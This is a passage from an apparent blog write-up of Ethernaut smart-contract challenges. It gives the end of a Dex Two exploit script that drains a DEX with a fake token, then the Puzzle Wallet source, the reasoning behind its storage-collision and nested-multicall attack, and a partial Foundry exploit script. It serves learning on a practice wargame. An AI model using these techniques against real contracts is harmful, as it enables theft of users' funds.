        <span class="nx">vm</span><span class="p">.</span><span class="nf">startBroadcast</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nf">envUint</span><span class="p">(</span><span class="dl">"</span><span class="s2">PRIVATE_KEY</span><span class="dl">"</span><span class="p">));</span>

        <span class="nx">address</span> <span class="nx">token1</span> <span class="o">=</span> <span class="nf">address</span><span class="p">(</span><span class="nx">dex</span><span class="p">.</span><span class="nf">token1</span><span class="p">());</span>
        <span class="nx">address</span> <span class="nx">token2</span> <span class="o">=</span> <span class="nf">address</span><span class="p">(</span><span class="nx">dex</span><span class="p">.</span><span class="nf">token2</span><span class="p">());</span>

        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Token 1 : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">token1</span><span class="p">);</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Token 2 : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">token2</span><span class="p">);</span>

        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">DEX balance in TOKEN1 </span><span class="dl">"</span><span class="p">,</span> <span class="nx">dex</span><span class="p">.</span><span class="nf">balanceOf</span><span class="p">(</span><span class="nx">token1</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="nx">dex</span><span class="p">)));</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">DEX balance in TOKEN2 </span><span class="dl">"</span><span class="p">,</span> <span class="nx">dex</span><span class="p">.</span><span class="nf">balanceOf</span><span class="p">(</span><span class="nx">token2</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="nx">dex</span><span class="p">)));</span>

        <span class="nx">Attack</span> <span class="nx">attack</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Attack</span><span class="p">();</span>
        
        <span class="c1">// dex.approve(address(attack), 10);</span>

        <span class="nx">attack</span><span class="p">.</span><span class="nf">exploit</span><span class="p">();</span>

        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Attacker balance in TOKEN1 </span><span class="dl">"</span><span class="p">,</span> <span class="nx">dex</span><span class="p">.</span><span class="nf">balanceOf</span><span class="p">(</span><span class="nx">token1</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="nx">attack</span><span class="p">)));</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Attacker balance in TOKEN2 </span><span class="dl">"</span><span class="p">,</span> <span class="nx">dex</span><span class="p">.</span><span class="nf">balanceOf</span><span class="p">(</span><span class="nx">token2</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="nx">attack</span><span class="p">)));</span>

        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">DEX balance in TOKEN1 </span><span class="dl">"</span><span class="p">,</span> <span class="nx">dex</span><span class="p">.</span><span class="nf">balanceOf</span><span class="p">(</span><span class="nx">token1</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="nx">dex</span><span class="p">)));</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">DEX balance in TOKEN2 </span><span class="dl">"</span><span class="p">,</span> <span class="nx">dex</span><span class="p">.</span><span class="nf">balanceOf</span><span class="p">(</span><span class="nx">token2</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="nx">dex</span><span class="p">)));</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopBroadcast</span><span class="p">();</span>

    <span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span> <span class="nx">Attack</span><span class="p">{</span>
    <span class="nx">Dex</span> <span class="kr">public</span> <span class="nx">dex</span> <span class="o">=</span> <span class="nc">Dex</span><span class="p">(</span><span class="mh">0xd8c665Dac001720A9efa0f478e63CABc5D64E9e9</span><span class="p">);</span>
    <span class="nx">address</span> <span class="nx">token1</span> <span class="o">=</span> <span class="nx">dex</span><span class="p">.</span><span class="nf">token1</span><span class="p">();</span>
    <span class="nx">address</span> <span class="nx">token2</span> <span class="o">=</span> <span class="nx">dex</span><span class="p">.</span><span class="nf">token2</span><span class="p">();</span>

    <span class="nx">MyEvilToken</span> <span class="nx">myToken1</span><span class="p">;</span>
    <span class="nx">MyEvilToken</span> <span class="nx">myToken2</span><span class="p">;</span>

    <span class="nf">constructor</span><span class="p">(){</span>
        <span class="nx">myToken1</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">MyEvilToken</span><span class="p">();</span>
        <span class="nx">myToken2</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">MyEvilToken</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="kd">function</span> <span class="nf">exploit</span><span class="p">()</span> <span class="kr">public</span><span class="p">{</span>
        <span class="c1">// IERC20(token1).transferFrom(0x699BceEbD59a5b52bB586C737cD7ba636f3Fe602, address(this), 10);</span>
        <span class="c1">// IERC20(token2).transferFrom(0x699BceEbD59a5b52bB586C737cD7ba636f3Fe602, address(this), 10);</span>
        
        <span class="nx">myToken1</span><span class="p">.</span><span class="nf">transfer</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="nx">dex</span><span class="p">),</span> <span class="mi">100</span><span class="p">);</span>
        <span class="nx">myToken2</span><span class="p">.</span><span class="nf">transfer</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="nx">dex</span><span class="p">),</span> <span class="mi">100</span><span class="p">);</span>


        <span class="nx">myToken1</span><span class="p">.</span><span class="nf">approve</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="nx">dex</span><span class="p">),</span> <span class="nf">type</span><span class="p">(</span><span class="nx">uint64</span><span class="p">).</span><span class="nx">max</span><span class="p">);</span>
        <span class="nx">myToken2</span><span class="p">.</span><span class="nf">approve</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="nx">dex</span><span class="p">),</span> <span class="nf">type</span><span class="p">(</span><span class="nx">uint64</span><span class="p">).</span><span class="nx">max</span><span class="p">);</span>

        <span class="nx">dex</span><span class="p">.</span><span class="nf">swap</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="nx">myToken1</span><span class="p">),</span> <span class="nx">token1</span><span class="p">,</span> <span class="nx">dex</span><span class="p">.</span><span class="nf">balanceOf</span><span class="p">(</span><span class="nx">token1</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="nx">dex</span><span class="p">)));</span>
        <span class="nx">dex</span><span class="p">.</span><span class="nf">swap</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="nx">myToken2</span><span class="p">),</span> <span class="nx">token2</span><span class="p">,</span> <span class="nx">dex</span><span class="p">.</span><span class="nf">balanceOf</span><span class="p">(</span><span class="nx">token2</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="nx">dex</span><span class="p">)));</span>
        
    <span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span> <span class="nx">MyEvilToken</span> <span class="nx">is</span> <span class="nc">ERC20</span><span class="p">(</span><span class="dl">"</span><span class="s2">MyEVILToken</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">EVIL</span><span class="dl">"</span><span class="p">){</span>
    <span class="nf">constructor</span><span class="p">(){</span>
        <span class="nf">_mint</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span> <span class="mi">10000</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>To run script :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">source</span> .env
<span class="nv">$ </span>forge script script/DexTwoSolve.s.sol:DexTwoSolve <span class="nt">--rpc-url</span> <span class="nv">$RPC_URL</span> <span class="nt">--broadcast</span>
</code></pre></div></div>

<h1 id="24-puzzle-wallet">24 Puzzle Wallet</h1>

<p><code class="language-plaintext highlighter-rouge">PuzzleWallet.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
<span class="nx">pragma</span> <span class="nx">experimental</span> <span class="nx">ABIEncoderV2</span><span class="p">;</span>

<span class="k">import</span> <span class="dl">"</span><span class="s2">./helpers/UpgradeableProxy-08.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">PuzzleProxy</span> <span class="nx">is</span> <span class="nx">UpgradeableProxy</span> <span class="p">{</span>
    <span class="nx">address</span> <span class="kr">public</span> <span class="nx">pendingAdmin</span><span class="p">;</span>
    <span class="nx">address</span> <span class="kr">public</span> <span class="nx">admin</span><span class="p">;</span>

    <span class="nf">constructor</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_admin</span><span class="p">,</span> <span class="nx">address</span> <span class="nx">_implementation</span><span class="p">,</span> <span class="nx">bytes</span> <span class="nx">memory</span> <span class="nx">_initData</span><span class="p">)</span> <span class="nc">UpgradeableProxy</span><span class="p">(</span><span class="nx">_implementation</span><span class="p">,</span> <span class="nx">_initData</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">admin</span> <span class="o">=</span> <span class="nx">_admin</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="nx">modifier</span> <span class="nx">onlyAdmin</span> <span class="p">{</span>
      <span class="nf">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span> <span class="o">==</span> <span class="nx">admin</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Caller is not the admin</span><span class="dl">"</span><span class="p">);</span>
      <span class="nx">_</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">proposeNewAdmin</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_newAdmin</span><span class="p">)</span> <span class="nx">external</span> <span class="p">{</span>
        <span class="nx">pendingAdmin</span> <span class="o">=</span> <span class="nx">_newAdmin</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">approveNewAdmin</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_expectedAdmin</span><span class="p">)</span> <span class="nx">external</span> <span class="nx">onlyAdmin</span> <span class="p">{</span>
        <span class="nf">require</span><span class="p">(</span><span class="nx">pendingAdmin</span> <span class="o">==</span> <span class="nx">_expectedAdmin</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Expected new admin by the current admin is not the pending admin</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">admin</span> <span class="o">=</span> <span class="nx">pendingAdmin</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">upgradeTo</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_newImplementation</span><span class="p">)</span> <span class="nx">external</span> <span class="nx">onlyAdmin</span> <span class="p">{</span>
        <span class="nf">_upgradeTo</span><span class="p">(</span><span class="nx">_newImplementation</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span> <span class="nx">PuzzleWallet</span> <span class="p">{</span>
    <span class="nx">address</span> <span class="kr">public</span> <span class="nx">owner</span><span class="p">;</span>
    <span class="nx">uint256</span> <span class="kr">public</span> <span class="nx">maxBalance</span><span class="p">;</span>
    <span class="nf">mapping</span><span class="p">(</span><span class="nx">address</span> <span class="o">=&gt;</span> <span class="nx">bool</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">whitelisted</span><span class="p">;</span>
    <span class="nf">mapping</span><span class="p">(</span><span class="nx">address</span> <span class="o">=&gt;</span> <span class="nx">uint256</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">balances</span><span class="p">;</span>

    <span class="kd">function</span> <span class="nf">init</span><span class="p">(</span><span class="nx">uint256</span> <span class="nx">_maxBalance</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nf">require</span><span class="p">(</span><span class="nx">maxBalance</span> <span class="o">==</span> <span class="mi">0</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Already initialized</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">maxBalance</span> <span class="o">=</span> <span class="nx">_maxBalance</span><span class="p">;</span>
        <span class="nx">owner</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="nx">modifier</span> <span class="nx">onlyWhitelisted</span> <span class="p">{</span>
        <span class="nf">require</span><span class="p">(</span><span class="nx">whitelisted</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">],</span> <span class="dl">"</span><span class="s2">Not whitelisted</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">_</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">setMaxBalance</span><span class="p">(</span><span class="nx">uint256</span> <span class="nx">_maxBalance</span><span class="p">)</span> <span class="nx">external</span> <span class="nx">onlyWhitelisted</span> <span class="p">{</span>
      <span class="nf">require</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span> <span class="o">==</span> <span class="mi">0</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Contract balance is not 0</span><span class="dl">"</span><span class="p">);</span>
      <span class="nx">maxBalance</span> <span class="o">=</span> <span class="nx">_maxBalance</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">addToWhitelist</span><span class="p">(</span><span class="nx">address</span> <span class="nx">addr</span><span class="p">)</span> <span class="nx">external</span> <span class="p">{</span>
        <span class="nf">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span> <span class="o">==</span> <span class="nx">owner</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Not the owner</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">whitelisted</span><span class="p">[</span><span class="nx">addr</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">deposit</span><span class="p">()</span> <span class="nx">external</span> <span class="nx">payable</span> <span class="nx">onlyWhitelisted</span> <span class="p">{</span>
      <span class="nf">require</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span> <span class="o">&lt;=</span> <span class="nx">maxBalance</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Max balance reached</span><span class="dl">"</span><span class="p">);</span>
      <span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">+=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">execute</span><span class="p">(</span><span class="nx">address</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">value</span><span class="p">,</span> <span class="nx">bytes</span> <span class="nx">calldata</span> <span class="nx">data</span><span class="p">)</span> <span class="nx">external</span> <span class="nx">payable</span> <span class="nx">onlyWhitelisted</span> <span class="p">{</span>
        <span class="nf">require</span><span class="p">(</span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="nx">value</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Insufficient balance</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">-=</span> <span class="nx">value</span><span class="p">;</span>
        <span class="p">(</span><span class="nx">bool</span> <span class="nx">success</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="nx">to</span><span class="p">.</span><span class="nx">call</span><span class="p">{</span> <span class="nl">value</span><span class="p">:</span> <span class="nx">value</span> <span class="p">}(</span><span class="nx">data</span><span class="p">);</span>
        <span class="nf">require</span><span class="p">(</span><span class="nx">success</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Execution failed</span><span class="dl">"</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">multicall</span><span class="p">(</span><span class="nx">bytes</span><span class="p">[]</span> <span class="nx">calldata</span> <span class="nx">data</span><span class="p">)</span> <span class="nx">external</span> <span class="nx">payable</span> <span class="nx">onlyWhitelisted</span> <span class="p">{</span>
        <span class="nx">bool</span> <span class="nx">depositCalled</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
        <span class="nf">for </span><span class="p">(</span><span class="nx">uint256</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">data</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">bytes</span> <span class="nx">memory</span> <span class="nx">_data</span> <span class="o">=</span> <span class="nx">data</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
            <span class="nx">bytes4</span> <span class="nx">selector</span><span class="p">;</span>
            <span class="nx">assembly</span> <span class="p">{</span>
                <span class="nl">selector</span> <span class="p">:</span><span class="o">=</span> <span class="nf">mload</span><span class="p">(</span><span class="nf">add</span><span class="p">(</span><span class="nx">_data</span><span class="p">,</span> <span class="mi">32</span><span class="p">))</span>
            <span class="p">}</span>
            <span class="nf">if </span><span class="p">(</span><span class="nx">selector</span> <span class="o">==</span> <span class="k">this</span><span class="p">.</span><span class="nx">deposit</span><span class="p">.</span><span class="nx">selector</span><span class="p">)</span> <span class="p">{</span>
                <span class="nf">require</span><span class="p">(</span><span class="o">!</span><span class="nx">depositCalled</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Deposit can only be called once</span><span class="dl">"</span><span class="p">);</span>
                <span class="c1">// Protect against reusing msg.value</span>
                <span class="nx">depositCalled</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="p">(</span><span class="nx">bool</span> <span class="nx">success</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nf">delegatecall</span><span class="p">(</span><span class="nx">data</span><span class="p">[</span><span class="nx">i</span><span class="p">]);</span>
            <span class="nf">require</span><span class="p">(</span><span class="nx">success</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Error while delegating call</span><span class="dl">"</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<ul>
  <li>Goal</li>
</ul>

<ol>
  <li>You’ll need to hijack this wallet to become the admin of the proxy.</li>
</ol>

<ul>
  <li>Solution</li>
</ul>

<ol>
  <li>PuzzleProxy is a proxy contract and PuzzleWallet is an implementation contract.</li>
  <li>Calls to PuzzleProxy will be forwarded to the PuzzleWallet through delegatecall.</li>
  <li>Recall that <code class="language-plaintext highlighter-rouge">delegatecall</code> updates the storage of the caller contract. So, the storage layout should not possess any collisons.</li>
  <li>Here, the storage layout of the two contracts are not matched. It may lead to storage collisions.</li>
  <li>Lets understand the goal of the challenge. We need to become the admin of the proxy contract.</li>
  <li>We can propose a new admin which will update the <code class="language-plaintext highlighter-rouge">pendingAdmin</code> variable in PuzzleProxy as well as the <code class="language-plaintext highlighter-rouge">owner</code> inside PuzzleWallet. Because of storage collision.</li>
  <li>Then call the <code class="language-plaintext highlighter-rouge">addToWhiteList()</code> with our Attacker address to be able to call other functions of PuzzleWallet.</li>
  <li>To override the <code class="language-plaintext highlighter-rouge">admin</code> variable in PuzzleProxy contract we have to change the <code class="language-plaintext highlighter-rouge">maxPrice</code> variable to address of our Attacker.</li>
  <li>To update <code class="language-plaintext highlighter-rouge">maxPrice</code> we need to drain all the funds of the the PuzzleWallet. Initially it has 0.001 ether, We can able to deposit some ether and withdraw the same amount of ether only using the <code class="language-plaintext highlighter-rouge">execute()</code> function.</li>
  <li>If we somehow able to pass this <code class="language-plaintext highlighter-rouge">require(balances[msg.sender] &gt;= value, "Insufficient balance");</code> check we can withdraw more ether from wallet.</li>
  <li>To do so, we need to send 0.001 ether only to the wallet, but we need to update the <code class="language-plaintext highlighter-rouge">balance[msg.sender]</code> to double of it. So that we can withdraw() 0.002 ether from the wallet. So that wallet balance will be zero.</li>
  <li>We can use the <code class="language-plaintext highlighter-rouge">multicall()</code> function to do this, we call the <code class="language-plaintext highlighter-rouge">multicall()</code> with 0.001 ether and pass the function signature of the <code class="language-plaintext highlighter-rouge">deposit()</code> so that our balance will become 0.001 ether and balance of wallet will be 0.002 ether.</li>
  <li>We cant call <code class="language-plaintext highlighter-rouge">deposit()</code> twice in a single call by passing calldata as [signature of <code class="language-plaintext highlighter-rouge">deposit</code> + signature of <code class="language-plaintext highlighter-rouge">deposit</code>]. As there is a check to catch this case.</li>
  <li>But we can send the singature of the <code class="language-plaintext highlighter-rouge">deposit()</code> and a call to <code class="language-plaintext highlighter-rouge">multicall()</code> again with the <code class="language-plaintext highlighter-rouge">deposit()</code> signature.</li>
  <li>That is we are calling multicall with a <code class="language-plaintext highlighter-rouge">deposit()</code> calldata along with multicall calldata with <code class="language-plaintext highlighter-rouge">deposit()</code> signature. i.e, a nested multicall.</li>
  <li>This will modify the <code class="language-plaintext highlighter-rouge">balance[msg.sender]</code> twice so that it will become 0.00 ether, but the actual wallet balance is 0.002.</li>
  <li>Now we have enough <code class="language-plaintext highlighter-rouge">balance[msg.sender]</code> to pass the check done in <code class="language-plaintext highlighter-rouge">execute()</code> function.</li>
  <li>So, now we can withdraw 0.002 ether from wallet, therefore the wallet balance becomes zero.</li>
</ol>

<p><code class="language-plaintext highlighter-rouge">PuzzleWalletSolve.s.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/Script.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/console.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="dl">"</span><span class="s2">../src/PuzzleWallet.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">PuzzleWalletSolve</span> <span class="nx">is</span> <span class="nx">Script</span><span class="p">{</span>
    <span class="nx">PuzzleProxy</span> <span class="kr">public</span> <span class="nx">proxy</span> <span class="o">=</span> <span class="nc">PuzzleProxy</span><span class="p">(</span><span class="nf">payable</span><span class="p">(</span><span class="mh">0xf8393D543826B4240CEb1Dc159aa83d6a879D8c2</span><span class="p">));</span>
    <span class="nx">PuzzleWallet</span> <span class="kr">public</span> <span class="nx">wallet</span> <span class="o">=</span> <span class="nc">PuzzleWallet</span><span class="p">(</span><span class="mh">0xf8393D543826B4240CEb1Dc159aa83d6a879D8c2</span><span class="p">);</span>

    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="nx">external</span><span class="p">{</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">startBroadcast</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nf">envUint</span><span class="p">(</span><span class="dl">"</span><span class="s2">PRIVATE_KEY</span><span class="dl">"</span><span class="p">));</span>

        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Wallet Owner  :</span><span class="dl">"</span><span class="p">,</span> <span class="nx">wallet</span><span class="p">.</span><span class="nf">owner</span><span class="p">());</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Proxy Admin :</span><span class="dl">"</span><span class="p">,</span> <span class="nx">proxy</span><span class="p">.</span><span class="nf">admin</span><span class="p">());</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Wallet Max Balance : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">wallet</span><span class="p">.</span><span class="nf">maxBalance</span><span class="p">());</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Proxy Pending Admin : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">proxy</span><span class="p">.</span><span class="nf">pendingAdmin</span><span class="p">());</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Wallet balance : </span><span class="dl">"</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="nx">wallet</span><span class="p">).</span><span class="nx">balance</span><span class="p">);</span>

        <span class="nx">Attack</span> <span class="nx">attack</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Attack</span><span class="p">();</span>

        <span class="nx">attack</span><span class="p">.</span><span class="nx">exploit</span><span class="p">{</span><span class="nl">value</span><span class="p">:</span> <span class="mf">0.001</span> <span class="nx">ether</span><span class="p">}();</span>


        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Wallet Owner  :</span><span class="dl">"</span><span class="p">,</span> <span class="nx">wallet</span><span class="p">.</span><span class="nf">owner</span><span class="p">());</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Proxy Admin :</span><span class="dl">"</span><span class="p">,</span> <span class="nx">proxy</span><span class="p">.</span><span class="nf">admin</span><span class="p">());</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Wallet Max Balance : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">wallet</span><span class="p">.</span><span class="nf">maxBalance</span><span class="p">());</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Proxy Pending Admin : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">proxy</span><span class="p">.</span><span class="nf">pendingAdmin</span><span class="p">());</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Wallet balance : </span><span class="dl">"</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="nx">wallet</span><span class="p">).</span><span class="nx">balance</span><span class="p">);</span>

        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopBroadcast</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>


<span class="nx">contract</span> <span class="nx">Attack</span> <span class="p">{</span>
    <span class="nx">PuzzleProxy</span> <span class="kr">public</span> <span class="nx">proxy</span> <span class="o">=</span> <span class="nc">PuzzleProxy</span><span class="p">(</span><span class="nf">payable</span><span class="p">(</span><span class="mh">0xf8393D543826B4240CEb1Dc159aa83d6a879D8c2</span><span class="p">));</span>
    <span class="nx">PuzzleWallet</span> <span class="kr">public</span> <span class="nx">wallet</span> <span class="o">=</span> <span class="nc">PuzzleWallet</span><span class="p">(</span><span class="mh">0xf8393D543826B4240CEb1Dc159aa83d6a879D8c2</span><span class="p">);</span>

    <span class="kd">function</span> <span class="nf">exploit</span><span class="p">()</span> <span class="nx">payable</span> <span class="kr">public</span><span class="p">{</span>
        <span class="nx">proxy</span><span class="p">.</span><span class="nf">proposeNewAdmin</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">));</span> <span class="c1">// Changes pendingAdmin in Proxy and overwrites owner in Wallet</span>

        <span class="nx">wallet</span><span class="p">.</span><span class="nf">addToWhitelist</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">));</span>

        <span class="c1">// To set maxPrice ==&gt; Wallet Balance should be 0, But Initiall Wallet Balance : 1000000000000000 (0.001 ETH)</span>
        <span class="c1">// Make Wallet Balance 0</span>

        <span class="c1">// use multicall to call deposit and multicall again with 0.001 eth</span>

        <span class="nx">bytes</span><span class="p">[]</span> <span class="nx">memory</span> <span class="nx">_depositSelector</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">bytes</span><span class="p">[](</span><span class="mi">1</span><span class="p">)</span> <span class="p">;</span>
        <span class="nx">_depositSelector</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">abi</span><span class="p">.</span><span class="nf">encodeWithSelector</span><span class="p">(</span><span class="nx">wallet</span><span class="p">.</span><span class="nx">deposit</span><span class="p">.</span><span class="nx">selector</span><span class="p">);</span>

        
        <span class="nx">bytes</span><span class="p">[]</span> <span class="nx">memory</span> <span class="nx">_nestedMulti</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">bytes</span><span class="p">[](</span><span class="mi">2</span><span class="p">);</span>
        <span class="nx">_nestedMulti</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">abi</span><span class="p">.</span><span class="nf">encodeWithSelector</span><span class="p">(</span><span class="nx">wallet</span><span class="p">.</span><span class="nx">deposit</span><span class="p">.</span><span class="nx">selector</span><span class="p">);</span>
